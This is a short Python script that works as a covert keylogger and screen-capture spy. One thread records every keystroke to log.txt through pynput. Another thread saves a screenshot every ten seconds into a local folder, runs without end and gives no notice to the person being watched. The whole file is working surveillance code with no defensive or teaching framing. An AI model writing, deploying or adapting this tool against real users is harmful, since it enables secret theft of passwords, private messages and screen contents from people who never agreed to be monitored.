from pynput.keyboard import Listener
from time import sleep
import pyautogui
import threading
import os

def write_to_file(key):
    event_letter = str(key)
    if event_letter.startswith("Key"):
        if event_letter == "Key.space":
            event_letter = " "
        elif event_letter == "Key.enter":
            event_letter = "\n"
        elif event_letter == "Key.backspace":
            event_letter = "*"
        else:
            event_letter = ""
    with open("log.txt", "a") as writer:
        writer.write(event_letter.replace("'",""))

def key_listener():
    with Listener(on_press=write_to_file) as write:
        write.join()

def take_screenshot():
    count = 0
    screenshot_location = "./screenshot"
    if not os.path.exists(screenshot_location):
        os.makedirs(screenshot_location)
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save(f"./{screenshot_location}/{screenshot_location}_{count}.png")
        count+=1
        sleep(10)


if __name__ == "__main__":
    key_listener_task = threading.Thread(target=key_listener)
    key_listener_task.start()
    screenshot_task = threading.Thread(target=take_screenshot)
    screenshot_task.start()